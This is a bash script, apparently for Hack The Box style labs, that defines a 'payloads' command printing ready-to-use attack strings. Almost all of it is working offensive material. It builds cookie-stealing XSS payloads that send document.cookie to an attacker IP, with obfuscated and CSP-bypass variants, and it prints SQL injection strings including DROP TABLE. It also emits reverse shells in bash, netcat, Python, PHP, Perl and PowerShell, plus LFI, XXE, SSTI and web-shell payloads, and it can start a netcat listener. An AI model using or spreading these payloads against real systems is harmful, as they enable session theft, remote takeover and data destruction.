#!/bin/bash

_payload_get_ip() {
    local ip="${1:-$(htbip 2>/dev/null)}"
    [[ -z "$ip" ]] && ip="YOUR_IP"
    echo "$ip"
}

_payload_xss() {
    local tag="${1:-img}"
    local port="${2:-4444}"
    local ip="$(_payload_get_ip "$3")"
    local cookies="${4:-false}"
    local path="xss_${tag}"
    
    case "$tag" in
        img)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=\"http://${ip}:${port}/${path}?c=\"+document.cookie>"
            else
                echo "<img src=\"http://${ip}:${port}/${path}\">"
            fi
            ;;
        img-onerror)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\">"
            else
                echo "<img src=x onerror=\"fetch('http://${ip}:${port}/${path}')\">"
            fi
            ;;
        script)
            echo "<script src=\"http://${ip}:${port}/${path}\"></script>"
            ;;
        script-fetch)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>fetch('http://${ip}:${port}/${path}?c='+document.cookie)</script>"
            else
                echo "<script>fetch('http://${ip}:${port}/${path}')</script>"
            fi
            ;;
        svg)
            if [[ "$cookies" == "true" ]]; then
                echo "<svg onload=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\">"
            else
                echo "<svg onload=\"fetch('http://${ip}:${port}/${path}')\">"
            fi
            ;;
        iframe)
            echo "<iframe src=\"http://${ip}:${port}/${path}\"></iframe>"
            ;;
        body)
            if [[ "$cookies" == "true" ]]; then
                echo "<body onload=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\">"
            else
                echo "<body onload=\"fetch('http://${ip}:${port}/${path}')\">"
            fi
            ;;
        input)
            if [[ "$cookies" == "true" ]]; then
                echo "<input onfocus=\"fetch('http://${ip}:${port}/${path}?c='+document.cookie)\" autofocus>"
            else
                echo "<input onfocus=\"fetch('http://${ip}:${port}/${path}')\" autofocus>"
            fi
            ;;
        csp-script)
            echo "<script src=\"${ip}:${port}\"></script>"
            ;;
        csp-meta)
            echo "<meta http-equiv=\"refresh\" content=\"0; url=http://${ip}:${port}/${path}\">"
            ;;
        csp-link)
            echo "<link rel=stylesheet href=\"http://${ip}:${port}/${path}\">"
            ;;
        csp-base)
            echo "<base href=\"http://${ip}:${port}/\">"
            ;;
        csp-iframe)
            echo "<iframe src=\"http://${ip}:${port}/${path}\"></iframe>"
            ;;
        csp-form)
            if [[ "$cookies" == "true" ]]; then
                echo "<form action=\"http://${ip}:${port}/${path}\" method=\"POST\"><input type=\"hidden\" name=\"cookie\" value=\"\"><script>document.forms[0].cookie.value=document.cookie;document.forms[0].submit()</script></form>"
            else
                echo "<form action=\"http://${ip}:${port}/${path}\" method=\"POST\"><input type=\"submit\" value=\"Click\"></form>"
            fi
            ;;
        csp-object)
            echo "<object data=\"http://${ip}:${port}/${path}\"></object>"
            ;;
        bypass-hex)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"\\x66\\x65\\x74\\x63\\x68('http://${ip}:${port}/${path}?c='+document.cookie)\">"
            else
                echo "<img src=x onerror=\"\\x66\\x65\\x74\\x63\\x68('http://${ip}:${port}/${path}')\">"
            fi
            ;;
        bypass-unicode)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"\\u0066\\u0065\\u0074\\u0063\\u0068('http://${ip}:${port}/${path}?c='+document.cookie)\">"
            else
                echo "<img src=x onerror=\"\\u0066\\u0065\\u0074\\u0063\\u0068('http://${ip}:${port}/${path}')\">"
            fi
            ;;
        bypass-entity)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=&#102;&#101;&#116;&#99;&#104;('http://${ip}:${port}/${path}?c='+document.cookie)>"
            else
                echo "<img src=x onerror=&#102;&#101;&#116;&#99;&#104;('http://${ip}:${port}/${path}')>"
            fi
            ;;
        bypass-base64)
            if [[ "$cookies" == "true" ]]; then
                local b64=$(echo -n "fetch('http://${ip}:${port}/${path}?c='+document.cookie)" | base64)
                echo "<img src=x onerror=\"eval(atob('$b64'))\">"
            else
                local b64=$(echo -n "fetch('http://${ip}:${port}/${path}')" | base64)
                echo "<img src=x onerror=\"eval(atob('$b64'))\">"
            fi
            ;;
        bypass-fromcharcode)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,${ip//./,},58,${port//./,},47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))\">"
            else
                echo "<img src=x onerror=\"eval(String.fromCharCode(102,101,116,99,104))\">"
            fi
            ;;
        bypass-template)
            if [[ "$cookies" == "true" ]]; then
                printf '<img src=x onerror="fetch`http://%s:%s/%s?c=$''{document.cookie}`">\n' "${ip}" "${port}" "${path}"
            else
                printf '<img src=x onerror="fetch`http://%s:%s/%s`">\n' "${ip}" "${port}" "${path}"
            fi
            ;;
        bypass-concat)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"fet\\u0063h('ht'+'tp://${ip}:${port}/${path}?c='+document['coo'+'kie'])\">"
            else
                echo "<img src=x onerror=\"fet\\u0063h('ht'+'tp://${ip}:${port}/${path}')\">"
            fi
            ;;
        bypass-comment)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"/**/fetch/**/(/**/'http://${ip}:${port}/${path}?c='/**/+/**/document.cookie/**/)\">"
            else
                echo "<img src=x onerror=\"/**/fetch/**/(/**/'http://${ip}:${port}/${path}'/**/)\">"
            fi
            ;;
        bypass-newline)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror=\"fetch(\n'http://${ip}:${port}/${path}?c='\n+\ndocument.cookie\n)\">"
            else
                echo "<img src=x onerror=\"fetch(\n'http://${ip}:${port}/${path}'\n)\">"
            fi
            ;;
        bypass-double)
            if [[ "$cookies" == "true" ]]; then
                echo "<img src=x onerror='fetch(\"http://${ip}:${port}/${path}?c=\"+document.cookie)'>"
            else
                echo "<img src=x onerror='fetch(\"http://${ip}:${port}/${path}\")'>"
            fi
            ;;
        bypass-backtick)
            if [[ "$cookies" == "true" ]]; then
                printf '<img src=x onerror=`fetch('"'"'http://%s:%s/%s?c='"'"'+document.cookie)`>\n' "${ip}" "${port}" "${path}"
            else
                printf '<img src=x onerror=`fetch('"'"'http://%s:%s/%s'"'"')`>\n' "${ip}" "${port}" "${path}"
            fi
            ;;
        csp-strict-script)
            if [[ "$cookies" == "true" ]]; then
                echo "<script src=\"http://${ip}:${port}/${path}.js?c=\"+document.cookie></script>"
            else
                echo "<script src=\"http://${ip}:${port}/${path}.js\"></script>"
            fi
            ;;
        csp-strict-link)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var l=document.createElement('link');l.rel='prefetch';l.href='http://${ip}:${port}/${path}?c='+document.cookie;document.head.appendChild(l)</script>"
            else
                echo "<link rel=\"prefetch\" href=\"http://${ip}:${port}/${path}\">"
            fi
            ;;
        csp-strict-import)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var l=document.createElement('link');l.rel='import';l.href='http://${ip}:${port}/${path}?c='+document.cookie;document.head.appendChild(l)</script>"
            else
                echo "<link rel=\"import\" href=\"http://${ip}:${port}/${path}\">"
            fi
            ;;
        csp-strict-manifest)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var l=document.createElement('link');l.rel='manifest';l.href='http://${ip}:${port}/${path}.json?c='+document.cookie;document.head.appendChild(l)</script>"
            else
                echo "<link rel=\"manifest\" href=\"http://${ip}:${port}/${path}.json\">"
            fi
            ;;
        csp-strict-dns)
            echo "<link rel=\"dns-prefetch\" href=\"http://${ip}:${port}\">"
            ;;
        csp-strict-preconnect)
            echo "<link rel=\"preconnect\" href=\"http://${ip}:${port}\">"
            ;;
        csp-strict-video)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var v=document.createElement('video');v.innerHTML='<source src=\"http://${ip}:${port}/${path}?c='+document.cookie+'\">'; document.body.appendChild(v)</script>"
            else
                echo "<video><source src=\"http://${ip}:${port}/${path}\"></video>"
            fi
            ;;
        csp-strict-audio)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var a=document.createElement('audio');a.src='http://${ip}:${port}/${path}?c='+document.cookie;document.body.appendChild(a)</script>"
            else
                echo "<audio src=\"http://${ip}:${port}/${path}\"></audio>"
            fi
            ;;
        csp-strict-embed)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var e=document.createElement('embed');e.src='http://${ip}:${port}/${path}?c='+document.cookie;document.body.appendChild(e)</script>"
            else
                echo "<embed src=\"http://${ip}:${port}/${path}\">"
            fi
            ;;
        csp-strict-track)
            if [[ "$cookies" == "true" ]]; then
                echo "<script>var v=document.createElement('video');v.innerHTML='<track src=\"http://${ip}:${port}/${path}.vtt?c='+document.cookie+'\">'; document.body.appendChild(v)</script>"
            else
                echo "<video><track src=\"http://${ip}:${port}/${path}.vtt\"></video>"
            fi
            ;;
        *)
            echo "<img src=\"http://${ip}:${port}/${path}\">"
            ;;
    esac
}

_payload_sqli() {
    local type="${1:-union}"
    
    case "$type" in
        union)
            echo "' UNION SELECT NULL,NULL,NULL--"
            ;;
        union-dump)
            echo "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
            ;;
        error)
            echo "' AND 1=CONVERT(int,(SELECT @@version))--"
            ;;
        boolean)
            echo "' AND '1'='1"
            ;;
        time)
            echo "' AND SLEEP(5)--"
            ;;
        stacked)
            echo "'; DROP TABLE users--"
            ;;
        *)
            echo "' OR 1=1--"
            ;;
    esac
}

_payload_rce() {
    local type="${1:-bash}"
    local ip="$(_payload_get_ip "$2")"
    local port="${3:-4444}"
    
    case "$type" in
        bash)
            echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1"
            ;;
        bash-b64)
            local cmd="bash -i >& /dev/tcp/${ip}/${port} 0>&1"
            echo "echo $(echo -n "$cmd" | base64) | base64 -d | bash"
            ;;
        nc)
            echo "nc ${ip} ${port} -e /bin/bash"
            ;;
        nc-mkfifo)
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
            ;;
        php)
            echo "php -r '\$sock=fsockopen(\"${ip}\",${port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
            ;;
        perl)
            echo "perl -e 'use Socket;\$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
            ;;
        powershell)
            echo "\$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            ;;
        *)
            echo "bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"
            ;;
    esac
}

_payload_lfi() {
    local type="${1:-basic}"
    local file="${2:-/etc/passwd}"
    
    case "$type" in
        basic)
            echo "../../../../${file}"
            ;;
        null)
            echo "../../../../${file}%00"
            ;;
        double)
            echo "....//....//....//....//${file}"
            ;;
        wrapper-php)
            echo "php://filter/convert.base64-encode/resource=${file}"
            ;;
        wrapper-data)
            echo "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
            ;;
        wrapper-expect)
            echo "expect://id"
            ;;
        *)
            echo "../../../${file}"
            ;;
    esac
}

_payload_xxe() {
    local ip="$(_payload_get_ip "$1")"
    local port="${2:-4444}"
    
    cat <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${ip}:${port}/xxe_poc"> ]>
<root>
  <data>&xxe;</data>
</root>
EOF
}

_payload_ssti() {
    local type="${1:-jinja2}"
    
    case "$type" in
        jinja2)
            echo "{{7*7}}"
            ;;
        jinja2-rce)
            echo "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ;;
        twig)
            echo "{{7*'7'}}"
            ;;
        freemarker)
            echo "\${7*7}"
            ;;
        velocity)
            echo "#set(\$x=7*7)\$x"
            ;;
        *)
            echo "{{7*7}}"
            ;;
    esac
}

payloads() {
    local type="" tag="" port="" ip="" file="" path="" listen=false all_tags=false cookies=false
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --type|-t) type="$2"; shift 2 ;;
            --tag) tag="$2"; shift 2 ;;
            --port|-p) port="$2"; shift 2 ;;
            --ip) ip="$2"; shift 2 ;;
            --file|-f) file="$2"; shift 2 ;;
            --path) path="$2"; shift 2 ;;
            --listen|-l) listen=true; shift ;;
            --all|-a) all_tags=true; shift ;;
            --cookies|-c) cookies=true; shift ;;
            --help|-h)
                cat <<EOF
Usage: payloads --type <TYPE> [OPTIONS]

Types:
  xss          XSS payloads
  sqli         SQL injection
  rce          Remote code execution
  lfi          Local file inclusion
  xxe          XML external entity
  ssti         Server-side template injection

XSS Options:
  --tag        Tag type: img, img-onerror, script, script-fetch, svg, iframe, body, input, csp-script, csp-meta, csp-link, csp-base, csp-iframe, csp-form, csp-object, bypass-hex, bypass-unicode, bypass-entity, bypass-base64, bypass-fromcharcode, bypass-template, bypass-concat, bypass-comment, bypass-newline, bypass-double, bypass-backtick, csp-strict-script, csp-strict-link, csp-strict-import, csp-strict-manifest, csp-strict-dns, csp-strict-preconnect, csp-strict-video, csp-strict-audio, csp-strict-embed, csp-strict-track
  --all        Print all XSS tags at once
  --cookies    Modify payloads to steal cookies (works with: img, img-onerror, script-fetch, svg, body, input, csp-form, bypass-*)
  --port       Port (default: 4444)
  --ip         IP address (default: htbip)
  --path       Path (default: xss_poc)
  --listen     Start nc listener on port
  
  CSP Strict Bypass: csp-strict-* variants work without inline event handlers (script-src 'self')

RCE Options:
  --tag        Shell type: bash, bash-b64, nc, nc-mkfifo, python, php, perl, powershell
  --port       Port (default: 4444)
  --ip         IP address (default: htbip)
  --listen     Start nc listener on port

LFI Options:
  --tag        Type: basic, null, double, wrapper-php, wrapper-data, wrapper-expect
  --file       File to read (default: /etc/passwd)

SQLi Options:
  --tag        Type: union, union-dump, error, boolean, time, stacked

SSTI Options:
  --tag        Engine: jinja2, jinja2-rce, twig, freemarker, velocity

XXE Options:
  --port       Port (default: 4444)
  --ip         IP address (default: htbip)
  --listen     Start nc listener on port

Examples:
  payloads --type xss --tag img --port 4444 --listen
  payloads --type rce --tag bash --port 4444 --listen
  payloads --type sqli --tag union
  payloads --type lfi --tag wrapper-php --file /etc/shadow
EOF
                return 0
                ;;
            *) echo "Unknown option: $1"; return 1 ;;
        esac
    done
    
    [[ -z "$type" ]] && { echo "Usage: payloads --type <TYPE> [OPTIONS] (use --help for details)"; return 1; }
    
    # Set default ports based on type if not specified
    if [[ -z "$port" ]]; then
        case "$type" in
            xss|xxe) port="4444" ;;
            rce) port="4444" ;;
            *) port="" ;;
        esac
    fi
    
    local payload=""
    case "$type" in
        xss)
            if [[ "$all_tags" == true ]]; then
                local tags=("img" "img-onerror" "script" "script-fetch" "svg" "iframe" "body" "input" "csp-script" "csp-meta" "csp-link" "csp-base" "csp-iframe" "csp-form" "csp-object" "bypass-hex" "bypass-unicode" "bypass-entity" "bypass-base64" "bypass-fromcharcode" "bypass-template" "bypass-concat" "bypass-comment" "bypass-newline" "bypass-double" "bypass-backtick" "csp-strict-script" "csp-strict-link" "csp-strict-import" "csp-strict-manifest" "csp-strict-dns" "csp-strict-preconnect" "csp-strict-video" "csp-strict-audio" "csp-strict-embed" "csp-strict-track")
                for t in "${tags[@]}"; do
                    echo "$(_payload_xss "$t" "$port" "$ip" "$cookies")"
                done
                return 0
            else
                payload=$(_payload_xss "$tag" "$port" "$ip" "$cookies")
            fi
            ;;
        sqli)
            payload=$(_payload_sqli "$tag")
            ;;
        rce)
            payload=$(_payload_rce "$tag" "$ip" "$port")
            ;;
        lfi)
            payload=$(_payload_lfi "$tag" "$file")
            ;;
        xxe)
            payload=$(_payload_xxe "$ip" "$port")
            ;;
        ssti)
            payload=$(_payload_ssti "$tag")
            ;;
        *)
            echo "Unknown type: $type"
            return 1
            ;;
    esac
    
    echo "$payload"
    
    if [[ "$listen" == true && -n "$port" ]]; then
        echo ""
        echo "[*] Starting listener on port $port..."
        ncstart "$port" tcp "payload_${type}_${port}"
    fi
}
